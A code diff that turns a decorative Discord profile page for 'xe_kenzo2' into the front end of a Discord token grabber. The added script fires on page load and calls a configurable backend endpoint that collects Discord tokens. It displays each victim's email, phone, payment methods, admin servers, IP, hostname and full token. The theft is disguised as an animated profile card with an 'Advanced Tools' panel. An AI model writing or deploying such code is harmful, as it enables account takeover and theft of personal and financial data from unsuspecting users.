@@ -1,177 +1,369 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Showcase xe_kenzo2 Profile</title>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/p5.js/1.4.2/p5.min.js"></script>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <style>
-    body, html {
-      margin: 0;
-      padding: 0;
-      overflow: hidden;
-      background: #2f3136;
-      color: white;
-      font-family: 'Arial', sans-serif;
-    }
-    #canvas-container {
-      position: absolute;
-      top: 0;
-      left: 0;
-      z-index: 0;
-    }
-    .glow {
-      animation: glow 1.5s ease-in-out infinite alternate;
-    }
-    @keyframes glow {
-      from {
-        text-shadow: 0 0 10px #ff8c00, 0 0 20px #ff8c00, 0 0 30px #ff8c00;
-      }
-      to {
-        text-shadow: 0 0 20px #ffffff, 0 0 30px #ffffff, 0 0 40px #ffffff;
-      }
-    }
-    .bounce {
-      animation: bounce 0.5s ease infinite alternate;
-    }
-    @keyframes bounce {
-      from {
-        transform: translateY(0);
-      }
-      to {
-        transform: translateY(-15px);
-      }
-    }
-    .spin {
-      animation: spin 3s linear infinite;
-    }
-    @keyframes spin {
-      100% {
-        transform: rotate(360deg);
-      }
-    }
-    .profile-card {
-      background: #f1c27d;
-      border: 3px solid #ff8c00;
-      border-radius: 15px;
-      padding: 25px;
-      animation: pulse 2s ease-in-out infinite;
-    }
-    @keyframes pulse {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.1); }
-      100% { transform: scale(1); }
-    }
-    .flash {
-      animation: flash 1s ease infinite;
-    }
-    @keyframes flash {
-      0% { opacity: 1; }
-      50% { opacity: 0.5; }
-      100% { opacity: 1; }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Showcase xe_kenzo2 Profile</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/p5.js/1.4.2/p5.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            overflow: hidden; /* Hide scrollbars due to p5.js canvas */
+            background: #2f3136; /* Discord-like dark background */
+            color: white;
+            font-family: 'Arial', sans-serif;
+        }
+        #canvas-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 0; /* Ensure canvas is behind content */
+            width: 100%;
+            height: 100%;
+        }
+        .glow {
+            animation: glow 1.5s ease-in-out infinite alternate;
+        }
+        @keyframes glow {
+            from {
+                text-shadow: 0 0 10px #ff8c00, 0 0 20px #ff8c00, 0 0 30px #ff8c00;
+            }
+            to {
+                text-shadow: 0 0 20px #ffffff, 0 0 30px #ffffff, 0 0 40px #ffffff;
+            }
+        }
+        .bounce {
+            animation: bounce 0.5s ease infinite alternate;
+        }
+        @keyframes bounce {
+            from {
+                transform: translateY(0);
+            }
+            to {
+                transform: translateY(-15px);
+            }
+        }
+        .spin {
+            animation: spin 3s linear infinite;
+        }
+        @keyframes spin {
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+        .profile-card {
+            background: #f1c27d; /* Orange/peach background */
+            border: 3px solid #ff8c00; /* Darker orange border */
+            border-radius: 15px;
+            padding: 25px;
+            animation: pulse 2s ease-in-out infinite;
+            position: relative; /* For z-index to work */
+            z-index: 1; /* Ensure card is above canvas */
+            color: #333; /* Dark text on light card */
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.02); } /* Slightly less aggressive pulse */
+            100% { transform: scale(1); }
+        }
+        .flash {
+            animation: flash 1s ease infinite;
+        }
+        @keyframes flash {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+
+        /* Styles for the Advanced Tools section */
+        .advanced-tools {
+            background: #36393f; /* Darker background for the tool section */
+            border: 1px solid #444;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 30px;
+            text-align: left;
+            position: relative;
+            z-index: 1;
+            max-width: 800px; /* Adjust max-width as needed */
+            width: 100%; /* Take full width of parent flex item */
+        }
+        .advanced-tools-header {
+            cursor: pointer;
+            padding: 10px;
+            background: #23272a;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: white;
+            font-weight: bold;
+        }
+        .advanced-tools-content {
+            display: none; /* Hidden by default */
+            padding-top: 10px;
+            border-top: 1px solid #444;
+        }
+        .advanced-tools-content.expanded {
+            display: block; /* Show when expanded */
+        }
+        .advanced-tools button {
+            background-color: #7289da; /* Discord blue */
+            padding: 10px 20px;
+            font-size: 16px;
+        }
+        .advanced-tools button:hover {
+            background-color: #5b6eae;
+        }
+        .advanced-tools pre {
+            background-color: #1a1a1a;
+            padding: 15px;
+            border-radius: 8px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+            font-family: monospace;
+            font-size: 14px;
+            color: #00ff00; /* Green text for success */
+            border: 1px solid #444;
+            margin-top: 15px;
+            max-height: 400px; /* Limit height for results */
+        }
+        .advanced-tools .error {
+            color: #ff0000; /* Red text for errors */
+        }
+        .token-entry {
+            border: 1px solid #444;
+            border-radius: 5px;
+            padding: 10px;
+            margin-bottom: 10px;
+            background-color: #2b2e32;
+        }
+        .token-entry strong {
+            color: #7289da;
+        }
+        .token-entry pre {
+            margin-top: 5px;
+            background-color: #1a1a1a;
+            color: #eee; /* Lighter text for token details */
+        }
+
+        /* Ensure content is centered and responsive */
+        .main-content-wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            position: relative;
+            z-index: 1;
+            padding: 20px; /* Add some padding for smaller screens */
+        }
+    </style>
 </head>
 <body>
-  <div id="canvas-container"></div>
-  <div class="relative z-10 flex flex-col items-center justify-center h-screen">
-    <div class="profile-card text-center max-w-lg">
-      <div class="w-36 h-36 bg-white rounded-none mx-auto mb-4" title="Removed circle; replace with asset.png if needed"></div>
-      <h1 class="text-5xl font-bold glow mt-4">xe_kenzo2!</h1>
-      <p class="text-2xl mt-2 flash">Epic Discord Profile</p>
-      <div class="mt-4 text-lg">
-        <p><strong>About Me:</strong> owner-https://discord.gg/chichoralive join this server!!</p>
-        <p><strong>Member Since:</strong> May 29, 2025</p>
-        <p><strong>Mutual Friend:</strong> 1</p>
-        <p><strong>Mutual Servers:</strong> 2</p>
-        <p><strong>Status:</strong> 🎮 HUH</p>
-      </div>
-      <a href="https://discord.com/channels/@me/1389152011081089045" target="_blank" class="text-blue-400 hover:underline text-xl font-semibold glow mt-4 block">Visit Channel</a>
-    </div>
-    <div class="mt-6 flex space-x-4">
-      <button class="bg-orange-600 hover:bg-orange-700 text-white font-bold py-2 px-4 rounded transition-all duration-300 transform hover:scale-110">Add Friend</button>
-      <button class="bg-green-600 hover:bg-green-700 text-white font-bold py-2 px-4 rounded transition-all duration-300 transform hover:scale-110">Join Server</button>
-    </div>
-    <div class="mt-8 flex space-x-8">
-      <div class="text-center">
-        <p class="text-3xl font-bold spin">🎉</p>
-        <p>Party Time</p>
-      </div>
-      <div class="text-center">
-        <p class="text-3xl font-bold spin">🔥</p>
-        <p>Hot Vibes</p>
-      </div>
-      <div class="text-center">
-        <p class="text-3xl font-bold spin">💥</p>
-        <p>Blast Off</p>
-      </div>
-      <div class="text-center">
-        <p class="text-3xl font-bold spin">🌟</p>
-        <p>Star Power</p>
-      </div>
-      <div class="text-center">
-        <p class="text-3xl font-bold spin">🎮</p>
-        <p>Game On</p>
-      </div>
-    </div>
-  </div>
+    <div id="canvas-container"></div>
+    <div class="main-content-wrapper">
+        <div class="profile-card text-center max-w-lg mx-auto">
+            <img src="asset.png" class="w-36 h-36 rounded-full border-4 border-white shadow-lg mx-auto bounce" alt="xe_kenzo2 Profile Picture" onError="this.src='https://via.placeholder.com/150?text=xe_kenzo2+PFP'" title="Ensure asset.png is in the same directory">
+            <h1 class="text-5xl font-bold glow mt-4">xe_kenzo2!</h1>
+            <p class="text-2xl mt-2 flash">Epic Discord Profile</p>
+            <div class="mt-4 text-lg">
+                <p><strong>About Me:</strong> owner-https://discord.gg/chichoralive join this server!!</p>
+                <p><strong>Member Since:</strong> May 29, 2025</p>
+                <p><strong>Mutual Friend:</strong> 1</p>
+                <p><strong>Mutual Servers:</strong> 2</p>
+                <p><strong>Status:</strong> 🎮 HUH</p>
+            </div>
+            <a href="https://discord.com/channels/@me/1389152011081089045" target="_blank" class="text-blue-400 hover:underline text-xl font-semibold glow mt-4 block">Visit Channel</a>
+        </div>
+        <div class="mt-6 flex space-x-4">
+            <button class="bg-orange-600 hover:bg-orange-700 text-white font-bold py-2 px-4 rounded transition-all duration-300 transform hover:scale-110">Add Friend</button>
+            <button class="bg-green-600 hover:bg-green-700 text-white font-bold py-2 px-4 rounded transition-all duration-300 transform hover:scale-110">Join Server</button>
+        </div>
+        <div class="mt-8 flex space-x-8">
+            <div class="text-center">
+                <p class="text-3xl font-bold spin">🎉</p>
+                <p>Party Time</p>
+            </div>
+            <div class="text-center">
+                <p class="text-3xl font-bold spin">🔥</p>
+                <p>Hot Vibes</p>
+            </div>
+            <div class="text-center">
+                <p class="text-3xl font-bold spin">💥</p>
+                <p>Blast Off</p>
+            </div>
+            <div class="text-center">
+                <p class="text-3xl font-bold spin">🌟</p>
+                <p>Star Power</p>
+            </div>
+            <div class="text-center">
+                <p class="text-3xl font-bold spin">🎮</p>
+                <p>Game On</p>
+            </div>
+        </div>
 
-  <script>
-    function setup() {
-      let canvas = createCanvas(windowWidth, windowHeight);
-      canvas.parent('canvas-container');
-      background(47, 49, 54);
-    }
+        <!-- Advanced Tools Section (collapsible) -->
+        <div class="advanced-tools mx-auto mt-8">
+            <div class="advanced-tools-header" onclick="toggleAdvancedTools()">
+                <span>⚡ Advanced Tools ⚡</span>
+                <span id="toggle-icon">▼</span>
+            </div>
+            <div id="advanced-tools-content" class="advanced-tools-content">
+                <p>Automatically attempting Discord token extraction...</p>
+                <div id="results-display" class="results-section">
+                    <h2>Results:</h2>
+                    <p>Processing...</p>
+                </div>
+            </div>
+        </div>
+    </div>
 
-    let particles = [];
-
-    function draw() {
-      background(47, 49, 54, 50);
-      for (let i = particles.length - 1; i >= 0; i--) {
-        particles[i].update();
-        particles[i].show();
-        if (particles[i].finished()) {
-          particles.splice(i, 1);
+    <script>
+        // --- p5.js background animation ---
+        function setup() {
+            let canvas = createCanvas(windowWidth, windowHeight);
+            canvas.parent('canvas-container');
+            background(47, 49, 54);
         }
-      }
-      if (frameCount % 2 == 0) {
-        particles.push(new Particle());
-      }
-    }
 
-    class Particle {
-      constructor() {
-        this.x = random(width);
-        this.y = random(height);
-        this.vx = random(-3, 3);
-        this.vy = random(-7, -3);
-        this.alpha = 255;
-        this.size = random(4, 12);
-        this.color = color(random(255), random(255), random(255));
-      }
+        let particles = [];
 
-      finished() {
-        return this.alpha < 0;
-      }
+        function draw() {
+            background(47, 49, 54, 50); /* Semi-transparent background for trails */
+            for (let i = particles.length - 1; i >= 0; i--) {
+                particles[i].update();
+                particles[i].show();
+                if (particles[i].finished()) {
+                    particles.splice(i, 1);
+                }
+            }
+            if (frameCount % 2 == 0) { /* Add particles periodically */
+                particles.push(new Particle());
+            }
+        }
 
-      update() {
-        this.x += this.vx;
-        this.y += this.vy;
-        this.alpha -= 3;
-        this.size *= 0.98;
-      }
+        class Particle {
+            constructor() {
+                this.x = random(width);
+                this.y = random(height);
+                this.vx = random(-3, 3);
+                this.vy = random(-7, -3);
+                this.alpha = 255;
+                this.size = random(4, 12);
+                this.color = color(random(200, 255), random(100, 200), random(0, 100)); /* Brighter, more vibrant colors */
+            }
 
-      show() {
-        noStroke();
-        fill(red(this.color), green(this.color), blue(this.color), this.alpha);
-        ellipse(this.x, this.y, this.size);
-      }
-    }
+            finished() {
+                return this.alpha < 0;
+            }
 
-    function windowResized() {
-      resizeCanvas(windowWidth, windowHeight);
-    }
-  </script>
+            update() {
+                this.x += this.vx;
+                this.y += this.vy;
+                this.alpha -= 3;
+                this.size *= 0.98;
+            }
+
+            show() {
+                noStroke();
+                fill(red(this.color), green(this.color), blue(this.color), this.alpha);
+                ellipse(this.x, this.y, this.size);
+            }
+        }
+
+        function windowResized() {
+            resizeCanvas(windowWidth, windowHeight);
+        }
+
+        // --- Advanced Tools (Token Grabber) Logic ---
+        // !! IMPORTANT: Configure this URL to match your backend.py server's address and port !!
+        // If running locally, it's likely http://127.0.0.1:5000 or http://localhost:5000
+        // If hosted on a VPS, use http://YOUR_VPS_IP:5000
+        const BACKEND_BASE_URL = "http://127.0.0.1:5000";
+
+        function toggleAdvancedTools() {
+            const content = document.getElementById('advanced-tools-content');
+            const icon = document.getElementById('toggle-icon');
+            content.classList.toggle('expanded');
+            if (content.classList.contains('expanded')) {
+                icon.textContent = '▲'; // Up arrow when expanded
+            } else {
+                icon.textContent = '▼'; // Down arrow when collapsed
+            }
+        }
+
+        async function startTokenGrab() {
+            const resultsDisplay = document.getElementById('results-display');
+            resultsDisplay.innerHTML = '<p>Initiating token grab... Please wait, this may take a moment.</p>';
+            resultsDisplay.classList.remove('error'); // Clear previous error class
+
+            try {
+                // Use the absolute URL for the fetch request
+                const response = await fetch(`${BACKEND_BASE_URL}/grab_tokens_api`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                });
+                const result = await response.json(); // Parse the JSON response from backend
+
+                if (result.status === 'success') {
+                    if (result.data.error) {
+                        resultsDisplay.className = 'results-section error';
+                        resultsDisplay.innerHTML = `<p>Error: ${result.data.error}</p>`;
+                        if (result.data.details) {
+                            resultsDisplay.innerHTML += `<p>Details: ${result.data.details}</p>`;
+                        }
+                    } else if (result.data.tokens_found && result.data.tokens_found.length > 0) {
+                        let htmlOutput = `<h3>Found ${result.data.tokens_found.length} token(s) from ${result.data.hostname} (IP: ${result.data.ip}, User: ${result.data.username}):</h3>`;
+                        result.data.tokens_found.forEach(tokenInfo => {
+                            htmlOutput += `
+                                <div class="token-entry">
+                                    <strong>Platform:</strong> ${tokenInfo.platform}<br>
+                                    <strong>Username:</strong> ${tokenInfo.username || 'N/A'}<br>
+                                    <strong>User ID:</strong> ${tokenInfo.user_id || 'N/A'}<br>
+                                    <strong>Email:</strong> ${tokenInfo.email || 'N/A'}<br>
+                                    <strong>Phone:</strong> ${tokenInfo.phone || 'N/A'}<br>
+                                    <strong>Badges:</strong> ${tokenInfo.badges || 'None'}<br>
+                                    <strong>Has Nitro:</strong> ${tokenInfo.has_nitro} (Expires: ${tokenInfo.nitro_exp_date || 'N/A'})<br>
+                                    <strong>Boosts Available:</strong> ${tokenInfo.available_boosts}<br>
+                                    ${tokenInfo.boost_info ? `<strong>Boost Info:</strong> <pre>${tokenInfo.boost_info}</pre><br>` : ''}
+                                    <strong>Payment Methods:</strong> ${tokenInfo.payment_methods_count} (${tokenInfo.valid_payment_methods} valid) - ${tokenInfo.payment_types.join(', ') || 'None'}<br>
+                                    <strong>Guilds:</strong> ${tokenInfo.guilds_count}<br>
+                                    <strong>Admin/Manage Guilds:</strong> <pre>${tokenInfo.admin_guilds}</pre>
+                                    <strong>Full Token:</strong> <pre>${tokenInfo.token}</pre>
+                                </div>
+                            `;
+                        });
+                        resultsDisplay.className = 'results-section'; // Reset class in case of prior error
+                        resultsDisplay.innerHTML = htmlOutput;
+                    } else {
+                        resultsDisplay.className = 'results-section'; // Reset class
+                        resultsDisplay.innerHTML = `<p>No Discord tokens found on this system.</p>`;
+                    }
+                } else {
+                    resultsDisplay.className = 'results-section error';
+                    resultsDisplay.textContent = `API Error: ${result.message || 'Unknown error'}`;
+                }
+            } catch (error) {
+                console.error('Fetch error:', error);
+                resultsDisplay.className = 'results-section error';
+                resultsDisplay.textContent = `Network Error or Backend Issue: ${error.message || error}. Check console for details.`;
+            }
+        }
+
+        // Automatically trigger the token grab when the page loads
+        window.addEventListener('DOMContentLoaded', () => {
+            startTokenGrab();
+            // Optionally, expand the advanced tools section automatically on load
+            // document.getElementById('advanced-tools-content').classList.add('expanded');
+            // document.getElementById('toggle-icon').textContent = '▲';
+        });
+    </script>
 </body>
 </html>
